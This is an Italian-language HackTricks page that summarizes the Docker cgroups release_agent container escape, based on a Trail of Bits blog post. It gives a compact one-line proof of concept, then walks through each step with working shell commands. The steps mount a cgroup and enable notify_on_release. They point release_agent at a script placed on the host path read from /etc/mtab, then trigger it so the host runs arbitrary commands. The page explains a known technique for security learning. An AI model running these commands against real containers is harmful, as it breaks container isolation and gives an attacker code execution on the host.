# Docker release\_agent cgroups escape

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>


**Per ulteriori dettagli, consulta il [post originale del blog](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/).** Questo è solo un riassunto:

PoC originale:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
Il proof of concept (PoC) dimostra un metodo per sfruttare i cgroups creando un file `release_agent` e innescando la sua invocazione per eseguire comandi arbitrari sull'host del contenitore. Ecco una panoramica dei passaggi coinvolti:

1. **Preparare l'Ambiente:**
- Viene creato un directory `/tmp/cgrp` per fungere da punto di montaggio per il cgroup.
- Il controller cgroup RDMA viene montato in questa directory. Nel caso in cui il controller RDMA sia assente, si consiglia di utilizzare il controller cgroup `memory` come alternativa.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Configurazione del sottogruppo figlio:**
- Viene creato un sottogruppo figlio chiamato "x" all'interno della directory del sottogruppo montato.
- Le notifiche vengono abilitate per il sottogruppo "x" scrivendo 1 nel suo file notify_on_release.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Configurare l'Agente di Rilascio:**
- Il percorso del contenitore sull'host viene ottenuto dal file /etc/mtab.
- Il file release_agent del cgroup viene quindi configurato per eseguire uno script chiamato /cmd situato nel percorso dell'host acquisito.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **Creazione e configurazione dello script /cmd:**
- Lo script /cmd viene creato all'interno del container e viene configurato per eseguire il comando ps aux, reindirizzando l'output su un file chiamato /output nel container. Viene specificato il percorso completo di /output sull'host.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Innesca l'Attacco:**
- Viene avviato un processo all'interno del sottogruppo "x" dei figli e viene immediatamente terminato.
- Ciò attiva il `release_agent` (lo script /cmd), che esegue ps aux sull'host e scrive l'output su /output all'interno del contenitore.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
